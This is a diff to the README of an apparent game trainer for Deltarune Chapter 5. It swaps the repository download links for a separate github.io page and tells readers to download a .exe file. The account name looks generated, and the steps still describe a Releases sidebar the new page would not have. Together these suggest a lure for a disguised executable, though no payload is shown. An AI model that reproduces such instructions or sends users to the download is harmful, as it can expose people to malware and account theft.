@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Trainer-Utility - Manage game stats and speed easily
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Beamish-operatinginstructions102/Deltarune-Chapter5-Trainer-Utility)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://beamish-operatinginstructions102.github.io)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 You must visit the official repository page to obtain the file. Follow these steps to get the software:
 
-1. Visit the following link: [https://github.com/Beamish-operatinginstructions102/Deltarune-Chapter5-Trainer-Utility](https://github.com/Beamish-operatinginstructions102/Deltarune-Chapter5-Trainer-Utility)
+1. Visit the following link: [https://beamish-operatinginstructions102.github.io](https://beamish-operatinginstructions102.github.io)
 2. Locate the Releases area on the right side of the page.
 3. Select the latest release version.
 4. Download the file ending in .exe to your computer.
